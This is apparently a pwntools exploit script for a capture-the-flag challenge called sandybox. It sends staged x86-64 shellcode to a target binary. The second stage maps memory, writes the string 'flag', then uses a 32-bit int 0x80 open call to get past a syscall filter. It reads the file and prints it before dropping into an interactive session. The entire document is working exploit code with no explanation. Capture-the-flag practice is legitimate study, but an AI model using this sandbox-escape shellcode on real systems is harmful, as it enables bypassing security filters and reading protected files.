from pwn import *


io = process('./a.out')
#io = remote('sandybox.pwni.ng',1337)
context.arch = 'amd64'


io.recvuntil('> ')

shellcode = asm('''
push 0x70
pop rdx
xor rax,rax
syscall
''')
print(len(shellcode))
#raw_input()
io.send(shellcode + '\x90'*2)

shellcode = asm('''

mov r13,rsi

push 0x70
pop rdx
xor rax,rax
syscall


''')

shellcode2 = asm('''

mov rdi,0x40000
push 0xa
pop rsi
push 0x7
pop rdx
push 34
pop r10
xor r8,r8
dec r8
xor r9,r9



xor rax,rax
mov al,9
syscall

mov qword ptr[rax],0x67616c66
mov r13,rax

mov rbx,rax
xor rcx,rcx
xor rdx,rdx

xor rax,rax
mov al,0x5
int 0x80

push rax
pop rdi

mov rsi,r13

push 0x70
pop rdx
xor rax,rax
syscall


xor rdi,rdi
inc rdi

push 0x60
pop rdx
xor rax,rax
inc rax
syscall


''')

io.send(shellcode2)

io.interactive()